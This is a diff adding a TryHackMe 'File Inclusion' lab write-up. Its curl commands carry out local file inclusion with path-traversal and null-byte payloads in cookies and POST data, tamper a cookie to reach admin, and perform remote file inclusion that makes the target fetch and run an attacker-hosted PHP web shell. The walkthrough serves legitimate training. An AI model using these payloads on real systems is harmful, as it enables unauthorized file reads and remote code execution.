@@ -1,0 +1,78 @@
+#+TITLE: File Inclusion (TryHackMe)
+#+AUTHOR: Bryan Rinders
+#+DATE: 2023-01-30
+#+OPTIONS: num:nil
+
+https://tryhackme.com/room/fileinc
+
+* Challenges
+** Flag 1
+On the right hand side of Firefox open the =menu > Web Developer >
+Inspector=. In the html source code find the form tag and change the
+method from =GET= to =POST=. Then on the actual web page fill =/etc/flag1= in
+in the form and press the include button. This should reveal the flag.
+
+** Flag 2
+From the hint it is clear that we have to edit the cookie to find the
+flag. To inspect the cookie run:
+
+#+begin_src sh
+curl -v http://10.10.124.167/challenges/chall2.php
+#+end_src
+
+and find the cookie among the header of the output. It has the value
+=Cookie: THM=Guest=. The obvious thing is to try and change the value
+=Admin=:
+
+#+begin_src sh
+  curl -H 'Cookie: THM=Admin' http://10.10.124.167/challenges/chall2.php -o flag2.txt
+#+end_src
+
+which reveals the admin page. Since there is not input form on this
+page and it is a LFI room the next thing to try is to change the value
+of the cookie to the file path to the flag. After a few tries the
+correct value was found:
+
+#+begin_src sh
+  curl -H 'Cookie: THM=../../../../etc/flag2%00' http://10.10.124.167/challenges/chall2.php -o flag2.txt
+#+end_src
+
+Locate the flag at the end of the file =flag2.txt=.
+
+** Flag 3
+The url input is filtered, everything that is not a-z is filtered
+out. To get around this change the method from get to =GET= to =POST=
+and set the data to be posted to =/etc/flag3%00=. The =%00= is
+necessary to prevent the =.php= from being added at the end as
+explained previously in the room.
+
+#+begin_src sh
+  curl -v http://ip/challenges/chall3.php -X  POST -d 'file=/etc/flag3%00' -o flag3.txt
+#+end_src
+
+Locate the flag at the end of the file =flag3.txt=.
+
+** Playground
+Since this is a RFI exercise we first need to create a =.php= file
+that will execute the command we want, =hostname=.
+
+#+begin_src sh
+  echo "<?PHP echo system('hostname') ?>" > rfi.php
+#+end_src
+
+Next we need a simple server that will host our file. The simplest way
+to do this is with python.
+
+#+begin_src sh
+  python -m http.server &
+#+end_src
+
+And finally add the file as a parameter in the url to get the hostname:
+
+#+begin_src sh
+  curl http://10.10.124.167/playground.php?file=http://10.10.95.70:8000/rfi.php
+#+end_src
+
+Note: the IP of the remote file is the IP of the attackbox and for the
+port number see the output of the python command. The port number
+defaults to 8000 but can be different.
